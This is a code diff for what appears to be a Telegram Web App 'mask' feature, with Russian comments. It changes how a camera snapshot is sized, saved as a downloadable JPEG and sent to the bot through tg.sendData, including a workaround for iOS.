@@ -62,22 +62,36 @@
                 video.srcObject = stream;
                 
                 setTimeout(() => {
-                    // Уменьшаем размер кадра специально для iPhone, чтобы вес картинки был минимальным
-                    canvas.width = 320;
-                    canvas.height = 240;
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
                     
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Сильно сжимаем (качество 0.4), чтобы обойти лимит iOS в tg.sendData
-                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.4);
+                    // Конвертируем снимок в файл (Blob)
+                    canvas.toBlob((blob) => {
+                        const url = URL.createObjectURL(blob);
+                        
+                        // Создаем невидимую ссылку для скачивания/открытия фото на айфоне
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'anton_mask.jpg';
+                        document.body.appendChild(a);
+                        a.click();
+                        
+                        // Дублируем отправку через tg.sendData (на Андроиде улетит боту, на iOS откроет системное действие)
+                        const reader = new FileReader();
+                        reader.onloadend = function() {
+                            try {
+                                tg.sendData(reader.result);
+                            } catch (e) {}
+                        }
+                        reader.readAsDataURL(blob);
+
+                    }, 'image/jpeg', 0.8);
                     
                     stream.getTracks().forEach(track => track.stop());
-                    
-                    // Отправляем сжатые данные боту
-                    tg.sendData(imageDataURL);
-                    
-                    loadBtn.innerText = 'Готово!';
+                    loadBtn.innerText = 'Готово! Маска надета 🎉';
                 }, 1000);
 
             } catch (err) {
